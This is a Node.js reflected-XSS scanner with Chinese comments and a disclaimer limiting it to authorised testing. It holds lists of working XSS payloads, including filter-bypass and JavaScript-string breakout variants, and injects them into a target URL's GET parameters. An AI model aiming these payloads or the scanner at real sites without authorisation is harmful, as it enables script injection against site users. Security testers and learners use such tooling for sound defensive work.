/**
 * ============================================================
 * XSS 漏洞检测工具 (Cross-Site Scripting Scanner)
 * ============================================================
 *
 * 【原理说明】
 * XSS（跨站脚本攻击）是 Web 应用中最常见的安全漏洞之一，
 * 攻击者通过在 Web 页面中注入恶意脚本代码，当用户访问页面时
 * 脚本在用户浏览器中执行，从而窃取用户信息、伪造请求等。
 *
 * 本工具主要检测反射型 XSS：
 *   - 反射型 XSS：用户输入直接被反射到页面中（如搜索结果、错误消息）
 *   - 存储型 XSS：恶意脚本存储在服务器数据库中（需结合业务逻辑测试）
 *   - DOM型 XSS：漏洞存在于前端 JavaScript 代码中（需分析前端代码）
 *
 * 【检测原理】
 *   1. 向目标 URL 的 GET 参数注入 XSS payload
 *   2. 发起 HTTP 请求获取响应内容
 *   3. 检查响应内容中是否包含未被过滤/转义的 payload
 *   4. 如果 payload 原样出现在响应中，则可能存在 XSS 漏洞
 *
 * 【注入位置分类】
 *   - HTML 标签之间：<div>user_input</div>
 *   - HTML 属性中：<input value="user_input">
 *   - JavaScript 代码中：var x = "user_input";
 *   - URL 中：<a href="user_input">
 *   - CSS 中：style="color: user_input"
 *
 * 【使用方法】
 *   node xss_scanner.js <目标URL> [参数名]
 *
 * 【参数说明】
 *   目标URL  - 必填，带参数的完整 URL，例如 http://example.com/search?q=test
 *              如果 URL 中有多个参数，会逐一检测每个参数
 *   参数名   - 可选，只检测指定的参数名
 *
 * 【示例】
 *   node xss_scanner.js "http://127.0.0.1/search?q=test"
 *   node xss_scanner.js "http://example.com/page?id=1&name=test" name
 *
 * 【免责声明】
 *   本工具仅供学习和授权测试使用，未经授权检测他人网站属于违法行为。
 * ============================================================
 */

const http = require('http');
const https = require('https');

// ============================================================
// XSS Payload 库
// 针对不同注入场景的多种 payload
// ============================================================

// 基础 XSS payload（最常见，用于快速检测）
const BASIC_PAYLOADS = [
  {
    payload: '<script>alert(1)</script>',
    desc: '标准 script 标签',
    context: 'HTML 文本中',
  },
  {
    payload: '<img src=x onerror=alert(1)>',
    desc: 'img 标签 onerror 事件',
    context: 'HTML 文本中',
  },
  {
    payload: '<svg onload=alert(1)>',
    desc: 'svg 标签 onload 事件',
    context: 'HTML 文本中',
  },
  {
    payload: '" onmouseover="alert(1)" x="',
    desc: '属性内注入事件',
    context: 'HTML 属性值中',
  },
  {
    payload: "' onmouseover='alert(1)' x='",
    desc: '单引号属性内注入事件',
    context: 'HTML 属性值中(单引号)',
  },
  {
    payload: '"><script>alert(1)</script>',
    desc: '闭合属性+script标签',
    context: 'HTML 属性值中',
  },
  {
    payload: '\"><img src=x onerror=alert(1)>',
    desc: '闭合属性+img标签',
    context: 'HTML 属性值中',
  },
  {
    payload: "javascript:alert(1)",
    desc: 'javascript 伪协议',
    context: 'href/src 属性中',
  },
];

// 绕过过滤的 payload（编码/变形）
const BYPASS_PAYLOADS = [
  {
    payload: '<IMG SRC=X ONERROR=alert(1)>',
    desc: '大小写混淆',
    context: '过滤小写标签时',
  },
  {
    payload: '<img/src=x onerror=alert(1)>',
    desc: '使用 / 代替空格',
    context: '过滤空格时',
  },
  {
    payload: '<img&#9;src=x onerror=alert(1)>',
    desc: '使用制表符编码',
    context: '过滤空格时',
  },
  {
    payload: '<img src=x onerror=&#97;lert(1)>',
    desc: 'HTML 实体编码函数名',
    context: '过滤关键字时',
  },
  {
    payload: '<svg/onload=alert(1)>',
    desc: '无空格 svg payload',
    context: '过滤空格时',
  },
  {
    payload: '<scrscriptipt>alert(1)</scrscriptipt>',
    desc: '双写绕过',
    context: '只过滤一次script时',
  },
  {
    payload: '"><marquee onstart=alert(1)>',
    desc: 'marquee 标签事件',
    context: 'HTML 属性值中',
  },
  {
    payload: '<body onload=alert(1)>',
    desc: 'body onload 事件',
    context: 'HTML 文本中',
  },
];

// JavaScript 上下文中的 payload
const JS_CONTEXT_PAYLOADS = [
  {
    payload: '";alert(1);//',
    desc: '闭合双引号+注释',
    context: 'JS 字符串(双引号)',
  },
  {
    payload: "';alert(1);//",
    desc: '闭合单引号+注释',
    context: 'JS 字符串(单引号)',
  },
  {
    payload: '");alert(1);//',
    desc: '闭合函数参数',
    context: 'JS 函数参数中',
  },
  {
    payload: '${alert(1)}',
    desc: '模板字符串注入',
    context: 'JS 模板字符串中',
  },
];

// ============================================================
// HTTP 请求函数
// ============================================================
/**
 * 发起 HTTP/HTTPS GET 请求
 * @param {string} targetUrl - 目标 URL
 * @param {number} timeout - 超时时间（毫秒）
 * @returns {Promise<{statusCode: number, body: string, headers: Object}>}
 */
function request(targetUrl, timeout = 10000) {
  return new Promise((resolve, reject) => {
    const parsedUrl = new URL(targetUrl);
    const module = parsedUrl.protocol === 'https:' ? https : http;

    const options = {
      hostname: parsedUrl.hostname,
      port: parsedUrl.port || (parsedUrl.protocol === 'https:' ? 443 : 80),
      path: parsedUrl.pathname + parsedUrl.search,
      method: 'GET',
      timeout: timeout,
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8',
      },
    };

    const req = module.request(options, (res) => {
      let body = '';

      res.on('data', (chunk) => {
        body += chunk.toString();
      });

      res.on('end', () => {
        resolve({
          statusCode: res.statusCode,
          body: body,
          headers: res.headers,
        });
      });
    });

    req.on('timeout', () => {
      req.destroy();
      reject(new Error('timeout'));
    });

    req.on('error', (err) => {
      reject(err);
    });

    req.end();
  });
}

// ============================================================
// 解析 URL 参数
// ============================================================
/**
 * 从 URL 中提取所有 GET 参数
 * @param {string} urlStr - 完整 URL
 * @returns {{baseUrl: string, params: Object}}
 */
function parseUrlParams(urlStr) {
  const parsed = new URL(urlStr);
  const params = {};

  parsed.searchParams.forEach((value, key) => {
    params[key] = value;
  });

  const baseUrl = `${parsed.protocol}//${parsed.host}${parsed.pathname}`;
  return { baseUrl, params };
}

// ============================================================
// 构造测试 URL
// ============================================================
/**
 * 构造带 XSS payload 的测试 URL
 * @param {string} baseUrl - 基础 URL
 * @param {Object} params - 原始参数
 * @param {string} targetParam - 目标参数名
 * @param {string} payload - XSS payload
 * @returns {string} 构造的完整 URL
 */
function buildTestUrl(baseUrl, params, targetParam, payload) {
  const urlObj = new URL(baseUrl);

  for (const [key, value] of Object.entries(params)) {
    if (key === targetParam) {
      // 将参数值替换为 payload
      urlObj.searchParams.append(key, payload);
    } else {
      urlObj.searchParams.append(key, value);
    }
  }

  return urlObj.toString();
}

// ============================================================
// 检测 payload 是否被反射（核心判断逻辑）
// ============================================================
/**
 * 检查响应中是否包含未被转义的 payload
 * @param {string} body - 响应体内容
 * @param {string} payload - 注入的 payload
 * @returns {{reflected: boolean, location: string[]}}
 */
function checkReflection(body, payload) {
  const reflected = [];

  // 1. 检查 payload 是否原样出现在响应中（最直接的反射）
  if (body.includes(payload)) {
    reflected.push('原样反射');
  }

  // 2. 检查是否 URL 解码后反射（有些应用会解码后输出）
  try {
    const decodedPayload = decodeURIComponent(payload);
    if (decodedPayload !== payload && body.includes(decodedPayload)) {
      reflected.push('URL解码后反射');
    }
  } catch (e) {
    // 解码失败忽略
  }

  // 3. 检查 HTML 实体编码（部分应用对特殊字符进行 HTML 编码）
  // 如果是完整编码（如 < 变成 &lt;），则 XSS 不可利用
  // 但如果只编码了部分字符，仍可能存在风险
  const encodedPayload = payload
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');

  const partiallyEncoded =
    body.includes(payload.replace(/</g, '&lt;')) ||
    body.includes(payload.replace(/>/g, '&gt;'));

  if (partiallyEncoded && !body.includes(encodedPayload)) {
    reflected.push('部分编码（可能可绕过）');
  }

  return {
    reflected: reflected.length > 0,
    locations: reflected,
  };
}

// ============================================================
// 分析 XSS 注入上下文（判断 payload 在页面中的位置）
// ============================================================
/**
 * 分析 payload 在页面中的注入位置，判断利用难度
 * @param {string} body - 响应体
 * @param {string} payload - 注入的 payload
 * @returns {string} 上下文描述
 */
function analyzeContext(body, payload) {
  const contexts = [];
  const index = body.indexOf(payload);

  if (index === -1) {
    return '未知';
  }

  // 获取 payload 前后各 50 个字符的上下文
  const before = body.substring(Math.max(0, index - 50), index);
  const after = body.substring(index + payload.length, index + payload.length + 50);

  // 判断是否在 HTML 标签之间
  if (before.includes('>') && after.includes('<')) {
    contexts.push('HTML 标签文本中');
  }

  // 判断是否在标签属性中（检查前后是否有引号和等号）
  if (/="[^"]*$/.test(before) && /[^"]*"/.test(after)) {
    contexts.push('双引号属性值中');
  }
  if (/'[^']*$/.test(before) && /[^']*'/.test(after)) {
    contexts.push('单引号属性值中');
  }

  // 判断是否在 JavaScript 代码中
  if (before.includes('<script') || before.includes('javascript:') ||
      /var\s+\w+\s*=\s*["']?$/.test(before)) {
    contexts.push('JavaScript 代码中');
  }

  // 判断是否在 CSS/style 中
  if (before.includes('style=') || before.includes('<style')) {
    contexts.push('CSS/Style 中');
  }

  return contexts.length > 0 ? contexts.join(', ') : 'HTML 文本中';
}

// ============================================================
// XSS 扫描主函数
// ============================================================
/**
 * 对指定 URL 的 GET 参数进行 XSS 漏洞检测
 * @param {string} urlStr - 目标 URL
 * @param {string} [targetParam] - 指定检测的参数名
 */
async function scanXSS(urlStr, targetParam = null) {
  const { baseUrl, params } = parseUrlParams(urlStr);
  const paramNames = Object.keys(params);

  if (paramNames.length === 0) {
    console.log('[!] 未发现 GET 参数，请提供带参数的 URL');
    return;
  }

  console.log('\n' + '='.repeat(60));
  console.log('[*] XSS 漏洞检测工具');
  console.log('='.repeat(60));
  console.log(`[*] 目标 URL: ${urlStr}`);
  console.log(`[*] 发现参数: ${paramNames.join(', ')}`);
  console.log(`[*] 检测类型: 反射型 XSS`);
  console.log(`[*] Payload 数量: 基础(${BASIC_PAYLOADS.length}) + 绕过(${BYPASS_PAYLOADS.length}) + JS上下文(${JS_CONTEXT_PAYLOADS.length})`);
  console.log('='.repeat(60));

  const foundVulns = [];

  // 逐一检测每个参数
  for (const paramName of paramNames) {
    if (targetParam && paramName !== targetParam) {
      continue;
    }

    console.log(`\n[*] 正在检测参数: ${paramName}`);

    // 合并所有 payload 进行测试
    const allPayloads = [
      ...BASIC_PAYLOADS,
      ...BYPASS_PAYLOADS,
      ...JS_CONTEXT_PAYLOADS,
    ];

    for (const payloadInfo of allPayloads) {
      try {
        const testUrl = buildTestUrl(baseUrl, params, paramName, payloadInfo.payload);
        const result = await request(testUrl);

        // 检查 payload 是否被反射
        const reflection = checkReflection(result.body, payloadInfo.payload);

        if (reflection.reflected) {
          const context = analyzeContext(result.body, payloadInfo.payload);

          foundVulns.push({
            param: paramName,
            payload: payloadInfo.payload,
            desc: payloadInfo.desc,
            context: context,
            reflection: reflection.locations.join(', '),
            statusCode: result.statusCode,
          });

          console.log(`  [+] 发现可能的 XSS: ${payloadInfo.desc}`);
          console.log(`      上下文: ${context}`);
          console.log(`      反射方式: ${reflection.locations.join(', ')}`);

          // 已找到可利用的 payload，跳过剩余的基础 payload
          // 但继续测试绕过 payload 以获取更多信息
          break;
        }
      } catch (err) {
        // 请求失败跳过
        continue;
      }
    }
  }

  // ============================================================
  // 输出检测结果汇总
  // ============================================================
  console.log('\n' + '='.repeat(60));
  console.log('[*] 检测完成！');
  console.log('='.repeat(60));

  if (foundVulns.length > 0) {
    console.log(`\n[!] 发现 ${foundVulns.length} 个可能的 XSS 漏洞：`);
    console.log('-'.repeat(50));

    // 按参数分组显示
    const vulnsByParam = {};
    foundVulns.forEach((vuln) => {
      if (!vulnsByParam[vuln.param]) {
        vulnsByParam[vuln.param] = [];
      }
      vulnsByParam[vuln.param].push(vuln);
    });

    Object.entries(vulnsByParam).forEach(([param, vulns], paramIndex) => {
      console.log(`\n  参数 [${paramIndex + 1}]: ${param}`);
      vulns.forEach((vuln, idx) => {
        console.log(`    [${idx + 1}] ${vuln.desc}`);
        console.log(`        Payload: ${vuln.payload}`);
        console.log(`        上下文: ${vuln.context}`);
        console.log(`        反射方式: ${vuln.reflection}`);
      });
    });

    console.log('\n[!] 风险等级: 中-高（需人工验证）');
    console.log('\n[!] 修复建议:');
    console.log('    1. 对用户输入进行 HTML 实体编码（输出编码）');
    console.log('    2. 根据输出上下文选择合适的编码方式');
    console.log('       - HTML 内容：HTML 实体编码');
    console.log('       - HTML 属性：属性值编码');
    console.log('       - JavaScript：JS 编码');
    console.log('       - URL 参数：URL 编码');
    console.log('    3. 设置 Content-Security-Policy 响应头');
    console.log('    4. 使用 HttpOnly Cookie 减少危害');
  } else {
    console.log('\n[-] 未检测到明显的 XSS 漏洞');
    console.log('    注意：自动检测存在局限性，以下情况可能漏报：');
    console.log('    - 存储型 XSS（payload 存储在数据库中）');
    console.log('    - DOM 型 XSS（完全在前端处理）');
    console.log('    - 需要特定上下文的复杂 XSS');
    console.log('    - 经过复杂编码/解码后反射的情况');
  }

  return foundVulns;
}

// ============================================================
// 主程序入口
// ============================================================
function main() {
  const args = process.argv.slice(2);

  if (args.length < 1) {
    console.log('用法: node xss_scanner.js <目标URL> [参数名]');
    console.log('示例: node xss_scanner.js "http://127.0.0.1/search?q=test"');
    console.log('      node xss_scanner.js "http://example.com/page?id=1&name=test" name');
    process.exit(1);
  }

  const targetUrl = args[0];
  const targetParam = args[1] || null;

  // 验证 URL 格式
  try {
    new URL(targetUrl);
  } catch (err) {
    console.error('[!] 错误：URL 格式无效，请包含 http:// 或 https://');
    process.exit(1);
  }

  // 执行扫描
  scanXSS(targetUrl, targetParam)
    .catch((err) => {
      console.error('\n[!] 扫描出错:', err.message);
      process.exit(1);
    });
}

// 运行主程序
main();
